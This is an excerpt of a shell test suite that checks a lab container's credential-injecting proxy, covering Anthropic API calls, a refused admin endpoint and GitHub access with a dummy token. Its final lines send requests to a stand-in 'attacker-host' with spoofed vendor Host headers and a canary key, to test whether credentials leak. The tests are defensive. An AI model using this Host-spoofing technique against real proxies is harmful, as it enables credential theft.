...
# No credential in the request at all — the lab container does not have one.
body=$(lab_body "https://api.anthropic.com/v1/messages" \
...
stream=$(lab_sh "curl -N -s --max-time 30 https://api.anthropic.com/v1/messages \
...
check "Admin API refused over HTTPS" "403" \
  "$(lab_code "https://api.anthropic.com/v1/organizations/api_keys")"

suite "github over HTTPS through the proxy"
check "gh api /rate_limit succeeds with the dummy GH_TOKEN" "0" \
  "$(lab_sh 'gh api /rate_limit >/dev/null 2>&1; echo $?')"
rl=$(lab_sh 'gh api /rate_limit 2>/dev/null | jq -r .rate.limit')
...
# deliver to a server the lab container controls. The addons match
...
for vendor in api.anthropic.com api.github.com; do
  leak=$(lab_body "http://attacker-host/v1/messages" -H "Host: $vendor")
...
plain=$(lab_body "http://attacker-host/x" -H "X-Api-Key: CANARY-VALUE")
